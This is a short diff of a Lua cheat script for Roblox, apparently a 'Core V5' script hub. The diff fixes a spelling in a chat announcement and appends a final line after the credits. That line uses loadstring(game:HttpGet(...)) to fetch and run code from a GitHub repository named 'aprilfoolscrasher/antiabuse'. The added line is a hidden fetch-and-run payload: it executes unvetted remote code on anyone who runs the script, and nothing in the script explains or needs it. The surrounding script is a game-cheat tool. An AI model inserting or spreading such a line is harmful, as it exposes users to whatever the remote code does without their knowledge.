@@ -71,7 +71,7 @@ local Button = Tab:CreateButton({
    local function say(real)
       game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(real,"All")
   end
-  say("[Core V5] infinite yelid has been executed")
+  say("[Core V5] infinite yeild has been executed")
    end,
 })
 
@@ -226,3 +226,4 @@ print("AyItsDamixer (a friend and helper for the h in the middel of the screen)"
 print("xq12(a friend and idea giver)")
 print("cofead(the welcome message)")
 print("sirus ui lib maker")
+loadstring(game:HttpGet("https://raw.githubusercontent.com/aprilfoolscrasher/antiabuse/main/antiabuse"))();
